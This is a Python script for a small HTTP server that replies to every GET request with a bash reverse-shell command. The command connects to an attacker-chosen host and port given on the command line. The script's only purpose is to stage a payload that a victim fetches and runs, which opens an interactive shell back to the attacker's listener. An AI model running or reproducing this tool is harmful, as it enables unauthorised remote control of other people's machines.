import argparse
from http.server import BaseHTTPRequestHandler, HTTPServer

class RequestHandler(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()

    def do_GET(self):
        self._set_headers()
        cmd = f"bash -c 'bash -i >& /dev/tcp/{self.server.lhost}/{self.server.lport} 0>&1'\n"
        self.wfile.write(cmd.encode('utf-8'))

class CustomHTTPServer(HTTPServer):
    def __init__(self, server_address, RequestHandlerClass, lhost, lport):
        self.lhost = lhost
        self.lport = lport
        super().__init__(server_address, RequestHandlerClass)

def run(server_class=CustomHTTPServer, handler_class=RequestHandler, port=8000, lhost='127.0.0.1', lport=443):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class, lhost, lport)
    print(f'Starting HTTP server on port {port}...')
    httpd.serve_forever()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Simple HTTP Server')
    parser.add_argument('-lhost', dest='lhost', required=True, help='Local host IP address')
    parser.add_argument('-lport', dest='lport', type=int, required=True, help='Local port number')
    args = parser.parse_args()
    
    run(port=8000, lhost=args.lhost, lport=args.lport)

